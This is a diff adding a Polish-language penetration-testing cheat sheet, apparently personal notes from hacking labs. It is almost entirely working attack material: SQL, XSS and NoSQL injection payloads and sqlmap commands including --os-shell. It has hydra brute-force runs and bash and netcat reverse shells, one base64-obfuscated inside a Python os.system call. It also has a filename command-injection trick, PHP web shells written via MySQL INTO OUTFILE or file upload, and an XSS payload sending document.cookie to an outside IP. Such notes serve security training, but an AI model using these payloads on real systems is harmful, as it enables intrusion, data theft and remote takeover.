@@ -1,0 +1,275 @@
+github/payloadbox/sql-injection-payload-list
+listy katalogow:
+/usr/share/metasploit-framework/data/wordlists/directory.txt
+/usr/share/wordlists/dirb/common.txt
+/usr/share/dirb/wordlists/small.txt
+/root/Desktop/wordlists/100-common-passwords.txt
+/root/.ZAP/fuzzers/dirbuster/
+/usr/share/wordlists/metasploit/unix_users.txt
+/usr/share/wordlists/metasloit/unix_passwords.txt (u mnie na kalim: /opt/metasploit-framework/embedded/framework/data/wordlists/unix_passwords.txt)
+/usr/share/wordlists/rockyou.txt
+/usr/share/seclists
+/usr/share/seclists/Fuzzing/SQLi/quick-SQLi.txt
+/usr/share/seclists/fuzzing/xss/xss-brutelogic.txt
+lista w ZAPie: Type: File Fuzzers -> jbrofuzz -> sql injection -> select everything
+
+payloady: 
+__import__('os').system('whoami | bash')  --python
+1.echo 'bash -c "bash -i >& /dev/tcp/192.16.92.2/4444 0>&1"' | base64
+2.__import__("os").system("echo
+YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTYuOTIuMi80NDQ0IDA+JjEiCg== |
+base64 -d | bash")
+
+sqli:
+' or 1=1 union select tbl_name,2,sql,4,5 from sqlite_master
+' or 1=1 union select sqlite_version(),2,3,4,5--
+
+rekonesans bazy danych:
+SELECT sql FROM sqlite_master
+WHERE tbl_name = 'table_name' AND type = 'table'
+
+a' or 1=1 union select sql,null,null,null,null from sqlite_master where tbl_name='secret_flag AND type = 'table'--
+
+XSS:
+"><script>alert("XSS")</script><!--
+<BODY ONLOAD=alert('XSS')>
+alert(1)
+
+podatności:
+WordPress Relevanssi Plugin (4.0.4) - Reflected Cross Site Scripting - CVE-2018-9034
+ApPHP MicroBlog - stored XSS 
+MyBB Downloads Plugin vulnerability - stored XSS
+rudimentary DOM-Based XSS vulnerability - DOM based XSS
+A version of PHPMyRecipes is vulnerable to an SQL injection attack. 
+
+
+
+linki:
+github.com/payloadbox/sql-injection-payload-list
+portswigger.net/web-security/sql-injection/cheat-sheet
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#mysql-error-based
+https://www.sqlite.org/schematab.html
+
+
+
+SQLmap:
+sqlmap -u "https://xxxx" --data "words_exact=" -p words_exact --method POST
+sqlmap -r request.txt -p words_exact --technique=E (error based)
+sqlmap -r request.txt -p words_exact --current-db # list current database 
+sqlmap -r request.txt -p words_exact  -D recipes --tables
+sqlmap -r request.txt -p words_exact  -D recipes -T users --dump
+sqlmap -r request.txt -p words_exact  --os-shell
+sqlmap -r request.txt -p words_exact  --os-pwn
+sqlmap -r request.txt -p words_exact  --current-user
+
+sqlmap -u "http://192.89.201.3:8000/results?rollno=100" -p rollno
+sqlmap -r request -p post # zapytanie GET
+sqlmap -u "http://jwjozxqhcwh31mcc4618w9cxs.stager3.attackdefenselabs.com/post.php?post=1" --dbs # to get database names on the server
+
+sqlmap -r request -p username
+
+TEST SQL RECZNY
+a' or 1=1--
+a" or 1=1--
+a' or 1=1#
+a" or 1=1#
+1' or 1=1--
+1" or 1=1--
+1' or 1=1#
+1" or 1=1#
+
+!czasem przydaje się jeszcze domykać cudzysłow,apostrofy
+np. payload 1' or '1'='1
+
+
+
+UNION:
+a' or 1=1 union select sqlite_version(),null,null,null,null--
+
+
+
+hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /root/Desktop/wordlists/100-common-passwords.txt ip http-get /digest/
+hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /root/Desktop/wordlists/100-common-passwords.txt ip http-get /basic/
+hydra -l admin -P /root/Desktop/wordlists/100-common-passwords.txt ip http-get /digest/
+
+nikto -h https://xxx.com/ # directory listing checkin build in
+nikto -h https://xxx.com/costam -Display V -Tuning 5
+nikto <flagi i parametry> > wynik.txt ; cat wynik.txt | grep vuln
+nikto <flagi i parametry> -Tuning 5 -o nikto.html -Format htm
+
+
+searchsploit "advanced electron forum"
+
+bash -c 'bash -i >& /dev/tcp/192.105.241.2/4444 0>&1
+nc -lvp 4444
+
+
+! trik: jak jest upload plików, jak przesyłana jest w JSONie nazwa pliku to możliwe, ze pod spodem jest robione polecenie echo "cccc" > nazwa_pliku, możesz do tego dołożyć znak ; i kolejne komendy
+
+
+writing PHP web shell using MySQL Query: select '<?php $output=shell_exec($_GET["cmd"]);echo "<pre>".$output."</pre>"?>' into outfile '/var/www/html/shell3.php' from mysql.user limit 1;
+
+
+nmap --script mysql-empty-password -p 3306 192.173.248.3
+
+! jak masz ataki na http to lepiej użyj burp niż hydra
+
+/usr/share/webshells/php/simple-backdoor.php
+
+
+!nowy tool:
+weevely generate
+weevely generate password ~/Desktop/weevely.jpg # generowanie web shella
+wchodizmy na url
+weevely https://strona.com/uploads/weevely.jpg/weevely.php password cmd i mamy taki shell interaktywny
+
+
+wpscan --url https://xyz.com/
+
+
+ciekawa sciezka na wordpressie: /wp-content/uploads/wp-security-audit-log/
+gobuster dir --url https://.com/ --wordlist(s) /usr/share/seclists/discovery/web-content/wordpress.fuzz.txt -b '404'
+gobuster dir -u http://192.156.207.3 -w /usr/share/wordlists/dirb/common.txt -b
+403,404 -x .php,.xml,.txt -r # find .php,.xml,.txt files
+
+
+Work the Flow File Upload - 1.2.1 - w tutorialu było takie cos: Exploit DB Link: https://www.exploit-db.com/exploits/36640
+wpscan --url https://xyz.com/ -U pentester -P /usr/share/wordlists/rockyou.txt
+
+/var/www/html/wp-config.php  # tu masz login i haslo do bazy danych
+
+curl -H "User-Agent: Firefox" -x 192.157.226.3:3128 127.0.0.1:80
+
+! wpisuj też w gogle i szukaj nie tylko w searchsploit (podatności dla konkretnych wersji programów)
+! a w searchsploit patrz tez na kolejne wersje bo jak kolejna wersja ma podatność to może obecna również
+
+https://github.com/payloadbox/xss-payload-list
+
+
+github.com/ -> mybbscan
+https://github.com/0xB9/MyBBscan
+
+! sam whois podpowiada nam, że na tym ip jest jeszcze kilka nazw i w ten sposób możemy znajdować VHOSTY
+
+przeszukiwanie grepem skryptów NMAPa: ls /usr/share/nmap/scripts | grep -e "apache"
+
+SOAP:
+?wsdl na końcu urla i masz dokumentacje
+soapAction bypass (usuwasz też body i header z SOAP)
+
+NO SQL PAYLOAD (MongoDB):
+/?name[$ne]=bob
+$gt: "" }
+/?name[$gt]=a
+
+upload CURL:
+curl -F "Filedata=@./shell.php" https://1ln24fpvu02iqvbpk1bcirxp6.eu-central-6.attackdefensecloudlabs.com/wp-content/plugins/wpstorecart/php/upload.php
+
+REKONESANS:
+dirb http://demo.ine.local
+dirb http://example.com /ścieżka/do/słownika.txt
+browsh --startup-url demo.ine.local (CTRL Q wyjście)
+
+
+CURL/upload pliku:
+curl -X OPTIONS demo.ine.local/uploads/ -v
+curl -XDELETE demo.ine.local/uploads/hello.txt
+curl demo.ine.local/uploads/ --upload-file hello.txt
+# PUT pliku hello.txt w BurpSuite
+PUT /uploads/hello.txt HTTP/1.1  i w body podajemy to co ma się tam znaleźć
+curl -X POST demo.ine.local/login.php -d "name=john&password=password" -v
+
+
+technika:
+DAV directory -> szukaj metody PUT
+
+fajny shell:
+<?php
+$output = shell_exec($_GET["cmd"]);
+echo "<pre>$output</pre>";
+?>
+
+CTRL SHIFT ALT - SCHOWEK
+
+ZONE TRANSFER
+dnsrecon -n 192.214.240.3 -d witrap.com  # jeszcze nie zone transfer, tylko recon
+dnsenum --dnsserver 192.214.240.3 witrap.com # zone transfer
+fierce -dns zonetransfer.me -dnsserver 192.214.240.3 # też zone transfer
+*dig axfr witrap.com @192.214.240.3
+*dig axfr -x 192.168 @192.214.240.3 # reverse DNS query, ip addr range = 102.168
+* lepsze wyniki daje DIG
+
+
+
+SZUKANIE flagi:
+find / -iname *flag* 2>/dev/null
+
+XSS:
+"><script>alert("XSS")</script><!--
+eval() - można w tę funkcję wrzucać alert(1) i się wykona
+
+XSSer:
+xsser --url 'http://192.94.37.3/index.php?page=dns-lookup.php' -p
+'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS'
+
+xsser --url 'http://192.94.37.3/index.php?page=dns-lookup.php' -p
+'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS' --Fp "<script>alert(1)</script>
+
+xsser --url 'http://192.94.37.3/index.php?page=dns-lookup.php' -p
+'target_host=XSS&dns-lookup-php-submit-button=Lookup+DNS' --Fp "<script>alert(1)</script> --auto
+
+! Trzymaj się dokładnie payloadów z exploitów, nie dodawaj nic intuicyjnie, przykład: 1'or'1'='1 było w exploicie a ja dodawałem 1'or'1'='1'--
+! Jak exploit nie działa na jakiś panel to może jest inny panel? Na przykład pod admin
+
+
+CiMe Citas Médicas - SQL Injection https://www.exploit-db.com/exploits/31350
+
+
+NSQL HACK:
+https://t3knpw01430451xsp3v8z5cu5.eu-central-5.attackdefensecloudlabs.com/?name[$ne]=bob
+https://t3knpw01430451xsp3v8z5cu5.eu-central-5.attackdefensecloudlabs.com/?name[$ne]:bob
+
+NETCAT reverse shell:
+nc -nvlp 1234
+nc [attacker_IP] 1234 -e /bin/bash
+README; bash -c 'bash -i >& /dev/tcp/192.105.241.2/4444 0>&1'
+
+
+PHP INJECTION:
+192.183.205.3/phpi.php?message=hello;phpinfo()
+192.183.205.3/phpi.php?message=hello;system('id')
+
+
+mysql -u username -p -h hostname -P port database_name
+! rób skany nmapem i sprawdzaj czy nie ma otwartych usług
+
+!omijanie filtra:
+dodajesz plik shell.jpg
+wywołujesz shell.jpg/shell.php
+
+! jak nie działa shell PHP to ładuj PHP5
+
+! uwaga czasem robisz file upload na daną ścieżkę np. https://z4xb54bnnhqwhovphkeyhv3xn.eu-central-6.attackdefensecloudlabs.com/wp-content/plugins/wpstorecart/php/upload.php, ale wywołujesz inną ścieżką: https://z4xb54bnnhqwhovphkeyhv3xn.eu-central-6.attackdefensecloudlabs.com/wp-content/uploads/wpstorecart/shell.php?cmd=id
+
+! jak masz wordpressa to robisz w pierwszej kolejności wpscan
+
+python -m SimpleHTTPServer 80
+
+
+
+XSS payload przy RFI
+<img id=”img” src=””>
+<script>
+document.getElementById(“img”).src=”http://192.123.219.2/?cookie=”+document.cookie
+</script>
+
+Wordpress - tip:
+czasami nie wersja pluginu jest podatna a sama wersja wordpressa
+searchsploit wordpress <version>
+- czasami nie szukaj exploita na konkretną wersje ale po prostu po nazwie pluginu
+
+Wordpress WordPress Plugin Work The Flow - https://www.exploit-db.com/exploits/36640
+
+CURL przez proxy:
+curl -H "User-Agent: Firefox" -x 192.21.234.3:3128 127.0.0.1:80
+
